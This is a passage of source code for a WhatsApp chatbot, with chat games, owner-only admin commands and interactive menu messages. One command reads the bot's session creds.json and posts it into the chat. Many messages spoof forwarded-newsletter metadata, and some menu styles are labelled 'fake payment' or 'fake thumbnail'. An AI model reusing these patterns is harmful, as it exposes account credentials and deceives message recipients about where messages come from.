            let winner = isSurrender ? room.game.currentTurn : room.game.winner
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Type *surrender* to surrender and admit defeat`
            if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
                room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
            if (room.x !== room.o) AlyaBotInc.sendText(room.x, str, m, {
                mentions: parseMention(str)
            })
            AlyaBotInc.sendText(room.o, str, m, {
                mentions: parseMention(str)
            })
            if (isTie || isWin) {
                delete this.game[room.id]
            }
        }
        
        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
	    AlyaBotInc.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    AlyaBotInc.sendText(m.chat, `Suit has been sent to chat

@${roof.p.split`@`[0]} and 
@${roof.p2.split`@`[0]}

Please choose a suit in the respective chat"
click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) AlyaBotInc.sendText(roof.p, `Please Select \n\Rock🗿\nPaper📄\nScissors✂️`, m)
	    if (!roof.pilih2) AlyaBotInc.sendText(roof.p2, `Please Select \n\nRock🗿\nPaper📄\nScissors✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) AlyaBotInc.sendText(m.chat, `Both Players Don't Want To Play,\nSuit Canceled`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    AlyaBotInc.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Didn't Choose Suit, Game Over!`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /scissors/i
	    let b = /rock/i
	    let k = /paper/i
	    let reg = /^(scissors|rock|paper)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    replygcalya(`You have chosen ${m.text} ${!roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih2) AlyaBotInc.sendText(roof.p2, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    replygcalya(`You have chosen ${m.text} ${!roof.pilih ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih) AlyaBotInc.sendText(roof.p, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    AlyaBotInc.sendText(roof.asal, `_*Suit Results*_${tie ? '\nSERIES' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost  \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    } //end
        
        //user db
        if (isCommand && !isUser) {
alyachoosen.push(sender)
fs.writeFileSync('./src/data/role/user.json', JSON.stringify(alyachoosen, null, 2))
}
        
        switch (isCommand) {
        	case 'socialmedia': 
        case 'sosmed': 
        case 'update':{
	const slides = [
    [
        'https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png', // Image URL
        '', // Title
        `Susbcribe Developer's YouTube Channel To Get Updates`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://youtube.com/@star_king0', // Command (URL in this case)
        'cta_url', // Button type
        'https://youtube.com/@star_king0' // URL (used in image generation)
    ], 
    [
        'https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Telegram_2019_Logo.svg/1024px-Telegram_2019_Logo.svg.png', // Image URL
        '', // Title
        `Susbcribe Developer's Telegram Channel To Get Updates`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'http://t.me/AlyaBotInc', // Command (URL in this case)
        'cta_url', // Button type
        'http://t.me/AlyaBotInc' // URL (used in image generation)
    ], 
    [
        'https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/GitHub_Invertocat_Logo.svg/360px-GitHub_Invertocat_Logo.svg.png', // Image URL
        '', // Title
        `Follow Developer On GitHub`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://github.com/STAR-KING0', // Command (URL in this case)
        'cta_url', // Button type
        'https://github.com/STAR-KING0' // URL (used in image generation)
    ], 
    [
        'https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1024px-WhatsApp.svg.png', // Image URL
        '', // Title
        `Follow Developer On Wa Channel`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09', // Command (URL in this case)
        'cta_url', // Button type
        'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09' // URL (used in image generation)
    ], 
    [
        'https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1024px-WhatsApp.svg.png', // Image URL
        '', // Title
        `Contact Developer On WhatsApp`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://Wa.me/2348100835767', // Command (URL in this case)
        'cta_url', // Button type
        'https://Wa.me/2348100835767' // URL (used in image generation)
    ], 
];

const sendSlide = async (jid, title, message, footer, slides) => {
    const cards = slides.map(async slide => {
        const [
            image,
            titMess,
            boMessage,
            fooMess,
            textCommand,
            command,
            buttonType,
            url,
        ] = slide;
        let buttonParamsJson = {};
        switch (buttonType) {
            case "cta_url":
                buttonParamsJson = {
                    display_text: textCommand,
                    url: url,
                    merchant_url: url,
                };
                break;
            case "cta_call":
                buttonParamsJson = { display_text: textCommand, id: command };
                break;
            case "cta_copy":
                buttonParamsJson = {
                    display_text: textCommand,
                    id: "",
                    copy_code: command,
                };
                break;
            case "cta_reminder":
            case "cta_cancel_reminder":
            case "address_message":
                buttonParamsJson = { display_text: textCommand, id: command };
                break;
            case "send_location":
                buttonParamsJson = {};
                break;
             case "quick_reply":
             buttonParamsJson = { display_text: textCommand, id: command };
             break;
            default:
                break;
        }
        const buttonParamsJsonString = JSON.stringify(buttonParamsJson);
        return {
            body: proto.Message.InteractiveMessage.Body.fromObject({
                text: boMessage,
            }),
            footer: proto.Message.InteractiveMessage.Footer.fromObject({
                text: fooMess,
            }),
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: titMess,
                hasMediaAttachment: true,
                ...(await prepareWAMessageMedia(
                    { image: { url: image } },
                    { upload: AlyaBotInc.waUploadToServer },
                )),
            }),
            nativeFlowMessage:
                proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                    buttons: [
                        {
                            name: buttonType,
                            buttonParamsJson: buttonParamsJsonString,
                        },
                    ],
                }),
        };
    });
    
    const msg = generateWAMessageFromContent(
        jid,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.fromObject({
                            text: message,
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.fromObject({
                            text: footer,
                        }),
                        header: proto.Message.InteractiveMessage.Header.fromObject({
                            title: title,
                            subtitle: title,
                            hasMediaAttachment: false,
                        }),
                        carouselMessage:
                            proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                cards: await Promise.all(cards),
                            }),
                            contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
                    }),
                },
            },
        },
        { quoted: m},
    );
    await AlyaBotInc.relayMessage(jid, msg.message, {
        messageId: msg.key.id,
    });
};
// Call the function with example parameters
sendSlide(m.chat, 'removed you', ownername, botname, slides);
}
break
            case 'addbadword': case 'addbd':
               if (!AlyaTheQueen) return AlyaStickOwner()
               if (!groupAdmins) return replygcalya(mess.admin)
               if (args.length < 1) return replygcalya( `Send command ${prefix}addbadword [harsh word]. Example ${prefix}addbadword asshole`)
               bad.push(q)
               fs.writeFileSync('./src/data/function/badword.json', JSON.stringify(bad))
               replygcalya('Successfully Added Bad Word!')
            break
            case 'delbadword': case 'deldb':
               if (!AlyaTheQueen) return AlyaStickOwner()
               if (!groupAdmins) return replygcalya(mess.admin)
               if (args.length < 1) return replygcalya( `Send commands ${prefix}addbadword [bad word]. Example ${prefix}addbadword asshole`)                 
               bad.splice(q)
               fs.writeFileSync('./src/data/function/badword.json', JSON.stringify(bad))
               replygcalya('Successfully Deleted Bad Word!')
            break 
            case 'resetuser':
            case 'resetdbuser': {
               if (!AlyaTheQueen) return AlyaStickOwner()
               let totalusernya = db.data.users[0]
               replygcalya(`Succesfully Deleted ${totalusernya} Users in Database`)
               db.data.users = []
            }
            break
            case 'resethit':
            case 'resettotalhit': {
               if (!AlyaTheQueen) return AlyaStickOwner()
               global.db.data.settings[botNumber].totalhit = 0
               replygcalya(mess.done)
            }
            break
            case 'setmenu': {
            if (!AlyaTheQueen) return AlyaStickOwner()
            if (text.startsWith('v')) {
                  typemenu = text
                  replygcalya(mess.done)
               } else {
               let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT MENU 🗂️",
"sections":[{"title":"SELECT THE MENU BELOW",
"highlight_label":"OWNER'S FAVOURITE",
"rows":[{"header":"BUTTON + CHANNEL V2",
"title":"CHOOSE ",
"description":"BUTTON + CHANNEL V2",
"id":"${prefix+command} v12"},
{"header":"BUTTON + CHANNEL",
"title":"CHOOSE ",
"description":"BUTTON + CHANNEL",
"id":"${prefix+command} v11"},
{"header":"ONLY BUTTON",
"title":"CHOOSE ",
"description":"ONLY BUTTON",
"id":"${prefix+command} v10"},
{"header":"CHANNEL + FAKE THUMBNAIL V2",
"title":"CHOOSE ",
"description":"CHANNEL + FAKE THUMBNAIL V2",
"id":"${prefix+command} v9"},
{"header":"CHANNEL + FAKE THUMBNAIL",
"title":"CHOOSE ",
"description":"CHANNEL + FAKE THUMBNAIL",
"id":"${prefix+command} v8"},
{"header":"FAKE THUMBNAIL + DOCUMENT",
"title":"CHOOSE ",
"description":"FAKE THUMBNAIL + DOCUMENT",
"id":"${prefix+command} v7"},
{"header":"FAKE PAYMENT",
"title":"CHOOSE ",
"description":"FAKE PAYMENT",
"id":"${prefix+command} v6"},
{"header":"CALL SCHEDULE",
"title":"CHOOSE",
"description":"CALL SCHEDULE",
"id":"${prefix+command} v5"},
{"header":"GIF THUMBNAIL",
"title":"CHOOSE",
"description":"GIF THUMBNAIL",
"id":"${prefix+command} v4"},
{"header":"VIDEO THUMBNAIL",
"title":"CHOOSE",
"description":"VIDEO THUMBNAIL",
"id":"${prefix+command} v3"},
{"header":"CHANNEL + THUMBNAIL",
"title":"CHOOSE",
"description":"CHANNEL + THUMBNAIL",
"id":"${prefix+command} v2"},
{"header":"IMAGE THUMBNAIL",
"title":"CHOOSE",
"description":"IMAGE THUMBNAIL",
"id":"${prefix+command} v1"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
            case 'setreply':{
               if (!AlyaTheQueen) return AlyaStickOwner()
               if (text.startsWith('v')) {
                  typereply = text
                  replygcalya(mess.done)
               } else {
                  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT REPLY 🐛",
"sections":[{"title":"SELECT THE REPLY BELOW",
"highlight_label":"OWNER'S FAVOURITE",
"rows":[{"header":"CHANNEL + LINK THUMB",
"title":"CHOOSE ",
"description":"CHANNEL + LINK THUMB",
"id":"${prefix+command} v4"},
{"header":"LARGE LINK + THUMBNAIL",
"title":"CHOOSE ",
"description":"LARGE LINK + THUMBNAIL",
"id":"${prefix+command} v3"},
{"header":"LINK + FAKE THUMBNAIL",
"title":"CHOOSE ",
"description":"LINK + FAKE THUMBNAIL",
"id":"${prefix+command} v2"},
{"header":"QUOTED NORMALLY",
"title":"CHOOSE ",
"description":"QUOTED NORMALLY",
"id":"${prefix+command} v1"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
            case 'statustext': 
            case 'upswtext':
            case 'upswteks': {
               if (!AlyaTheQueen) return AlyaStickOwner()
               if (!q) return replygcalya('Text?')
               await AlyaBotInc.sendMessage('status@broadcast', { text: q }, { backgroundColor: '#FF000000', font: 3, statusJidList: Object.keys(global.db.data.users) })
               replygcalya(mess.done)
            }
            break
            case 'statusvideo':
            case 'upswvideo': {
               if (!AlyaTheQueen) return AlyaStickOwner()
               if (/video/.test(mime)) {
                  var videosw = await AlyaBotInc.downloadAndSaveMediaMessage(quoted)
                  await AlyaBotInc.sendMessage('status@broadcast', {
                     video: {
                        url: videosw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.data.users) })
                  await replygcalya(mess.done)
               } else {
                  replygcalya('Reply to video')
               }
            }
            break
            case 'statusimg':
            case 'statusimage':
            case 'upswimg': {
               if (!AlyaTheQueen) return AlyaStickOwner()
               if (/image/.test(mime)) {
                  var imagesw = await AlyaBotInc.downloadAndSaveMediaMessage(quoted)
                  await AlyaBotInc.sendMessage('status@broadcast', {
                     image: {
                        url: imagesw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.data.users)})
                  await replygcalya(mess.done)
               } else {
                  replygcalya('Reply to image')
               }
            }
            break
            case 'statusaudio':
            case 'upswaudio': {
               if (!AlyaTheQueen) return AlyaStickOwner()
               if (/audio/.test(mime)) {
                  var audiosw = await AlyaBotInc.downloadAndSaveMediaMessage(quoted)
                  await AlyaBotInc.sendMessage('status@broadcast', {
                     audio: {
                        url: audiosw
                     },
                     mimetype: 'audio/mp4',
                     ptt: true
                  }, {
                     backgroundColor: '#FF000000',
                     statusJidList: Object.keys(global.db.data.users)
                  })
                  await replygcalya(mess.done)
               } else {
                  replygcalya('Reply to audio')
               }
            }
            break
            case 'setimgmenu':
            case 'sim': {
                if (!AlyaTheQueen) return AlyaStickOwner()
                let delb = await AlyaBotInc.downloadAndSaveMediaMessage(quoted)
                await fsx.copy(delb, './AlyaMedia/theme/alya.jpg')
                fs.unlinkSync(delb)
                replygcalya(mess.done)
            }
            break
            case 'setvidmenu':
            case 'svm': 
            	case 'setvgifmenu':
            case 'sgm': {
                if (!AlyaTheQueen) return AlyaStickOwner()
                let delb = await AlyaBotInc.downloadAndSaveMediaMessage(quoted)
                await fsx.copy(delb, './AlyaMedia/theme/Cheems-bot.mp4')
                fs.unlinkSync(delb)
                replygcalya(mess.done)
            }
            break
            case 'addtitle':{
               if (!AlyaTheQueen) return AlyaStickOwner()
               if (!text) return replygcalya(`Usage ${prefix + command} number|title`)
               nonya = text.split('|')[0]
               titlenya = text.split('|')[1]
               let oo = `${nonya}@s.whatsapp.net`
               db.data.users[oo].title = titlenya
               await replygcalya(mess.done)
            }
            break
            case 'deltitle':{
               if (!AlyaTheQueen) return AlyaStickOwner()
               if (!text) return replygcalya(`Usage ${prefix + command} number`)
               nonya = text.split(',')[0]
               let oo = `${nonya}@s.whatsapp.net`
               db.data.users[oo].title = ''
               await replygcalya(mess.done)
            }
            break
            case 'addlimit':
            case 'givelimit':{
                if (!AlyaTheQueen) return AlyaStickOwner()
                if (!text) return replygcalya(`Usage ${prefix + command} number|limit amount`)
                usernya = text.split('|')[0]
                limitnya = text.split('|')[1]
                let oo = `${usernya}@s.whatsapp.net`
                db.data.users[oo].limit += limitnya
                replygcalya(mess.done)
            }
            break
            case 'dellimit':{
                if (!AlyaTheQueen) return AlyaStickOwner()
                if (!text) return replygcalya(`Usage ${prefix + command} number|limit amount`)
                usernya = text.split('|')[0]
                limitnya = text.split('|')[1]
                if (db.data.users[usernya + '@s.whatsapp.net'].limit < limitnya) return replygcalya(`His Limit Is Less Than ${limitnya}`)
                db.data.users[usernya + '@s.whatsapp.net'].limit -= limitnya
                replygcalya(mess.done)
            }
            break
            case 'addprem':
                if (!AlyaTheQueen) return AlyaStickOwner()
                if (args.length < 2)
                    return replygcalya(`Usage ${prefix + command} @tag time\n${prefix + command} number time\n\nExample : ${prefix + command} @tag 30d`)
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        addPremiumUser(m.mentionedJid[0], args[1], premium)
                    }
                    replygcalya("Premium Success")
                } else {
                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium)
                    replygcalya("Premium Success")
                }
            break
            case 'delprem':
                if (!AlyaTheQueen) return AlyaStickOwner()
                if (args.length < 1) return replygcalya(`Usage ${prefix + command} @tag\n${prefix + command} number\n\nExample : ${prefix + command} 2348100835767`)
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1)
                        fs.writeFileSync("./src/data/role/premium.json", JSON.stringify(premium))
                    }
                    replygcalya("Delete Success")
                } else {
                    premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1)
                    fs.writeFileSync("./src/data/role/premium.json", JSON.stringify(premium))
                    replygcalya("Delete Success")
                }
            break
            case 'listprem': {
                if (!AlyaTheQueen) return AlyaStickOwner()
                let data = require('./src/data/role/premium.json')
                let txt = `*------「 LIST PREMIUM 」------*\n\n`
                for (let x of data) {
                    txt += `Number : ${x.id}\n`
                    txt += `Expire In: ${x.expired} ms\n`
                AlyaBotInc.sendMessage(m.chat, {
                    text: txt,
                    mentions: x
                }, {
                    quoted: m
                })
                }
            }
            break
case 'addowner':
if (!AlyaTheQueen) return AlyaStickOwner()
if (!args[0]) return replygcalya(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await AlyaBotInc.onWhatsApp(bnnd)
if (ceknye.length == 0) return replygcalya(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./src/data/role/owner.json', JSON.stringify(owner))
replygcalya(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
if (!AlyaTheQueen) return AlyaStickOwner()
if (!args[0]) return replygcalya(`Use ${prefix+command} nomor\nExample ${prefix+command} 2348100835767`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./src/data/role/owner.json', JSON.stringify(owner))
replygcalya(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
case 'listowner': {
                let teks = '┌──⭓「 *List Owner* 」\n│\n'
                for (let x of owner) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${owner.length}*`
                replygcalya(teks)
            }
            break
            case 'delsession':
            case 'clearsession': {
                if (!AlyaTheQueen) return AlyaStickOwner()
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return replygcalya('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Detected ${filteredArray.length} junk files\n\n`
                    if (filteredArray.length == 0) return replygcalya(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    replygcalya(teks)
                    await sleep(2000)
                    replygcalya("Deleting junk files...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    replygcalya("Successfully deleted all the trash in the session folder")
                });
            }
            break
            case 'join':
                try {
                    if (!AlyaTheQueen) return AlyaStickOwner()
                    if (!text) return replygcalya('Enter Group Link!')
                    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcalya('Link Invalid!')
                    let result = args[0].split('https://chat.whatsapp.com/')[1]
                    AlyaBotInc.groupAcceptInvite(result)
                    await replygcalya(`Done`)
                } catch {
                    replygcalya('Failed to join the Group')
                }
                break
            case 'getsession':
                if (!AlyaTheQueen) return AlyaStickOwner()
                replygcalya('Wait a moment, currently retrieving your session file')
                let sesi = fs.readFileSync('./session/creds.json')
                AlyaBotInc.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: m
                })
            break
            case 'myip':
            case 'ipbot':
                if (!AlyaTheQueen) return AlyaStickOwner()
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        replygcalya("🔎 My public IP address is: " + ip);
                    })
                })
            break
            case 'request': case 'reportbug': {
	if (!text) return replygcalya(`Example : ${
        prefix + command
      } hi dev play command is not working`)
            textt = `*| REQUEST/BUG |*`
            teks1 = `\n\n*User* : @${
   m.sender.split("@")[0]
  }\n*Request/Bug* : ${text}`
            teks2 = `\n\n*Hii ${pushname},You request has been forwarded to my Owners*.\n*Please wait...*`
            for (let i of owner) {
                AlyaBotInc.sendMessage(i + "@s.whatsapp.net", {
                    text: textt + teks1,
                    mentions: [m.sender],
                }, {
                    quoted: m,
                })
            }
            AlyaBotInc.sendMessage(m.chat, {
                text: textt + teks2 + teks1,
                mentions: [m.sender],
            }, {
                quoted: m,
            })

        }
        break
            case 'shutdown':
                if (!AlyaTheQueen) return AlyaStickOwner()
                replygcalya(`Restarting will be completed in seconds`)
                await sleep(3000)
                process.exit()
            break
            case 'autoread':
                if (!AlyaTheQueen) return AlyaStickOwner()
                if (q === 'on') {
                    db.data.settings[botNumber].autoread = true
                    replygcalya(`Successfully changed autoread to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autoread = false
                    replygcalya(`Successfully changed autoread to ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'unavailable':
                if (!AlyaTheQueen) return AlyaStickOwner()
                if (q === 'on') {
                    db.data.settings[botNumber].online = true
                    replygcalya(`Successfully changed unavailable to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].online = false
                    replygcalya(`Successfully changed unavailable to ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'autorecordtype':
                if (!AlyaTheQueen) return AlyaStickOwner()
                
                if (q === 'on') {
                    db.data.settings[botNumber].autorecordtype = true
                    replygcalya(`Successfully changed Auto-RecordingTyping to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autorecordtype = false
